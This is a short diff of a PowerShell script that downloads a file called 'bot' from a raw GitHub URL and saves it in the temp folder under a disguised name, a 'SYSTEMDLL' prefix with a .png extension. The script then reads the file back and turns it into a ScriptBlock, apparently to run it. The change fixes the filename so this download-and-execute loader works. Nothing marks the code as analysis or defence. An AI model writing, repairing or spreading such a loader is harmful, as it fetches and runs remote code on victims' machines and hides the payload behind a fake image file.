@@ -12,7 +12,7 @@ $bot = "https://raw.githubusercontent.com/ghostleaper/rhino/main/bot";
 $wc.DownloadFile("$bot","$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.png");
 
 
-$AnyFile = Get-Content $temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.ps1 -Raw
+$AnyFile = Get-Content $temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.png -Raw
 
     $ScriptBlock = [System.Management.Automation.ScriptBlock]::Create($AnyFile)
 
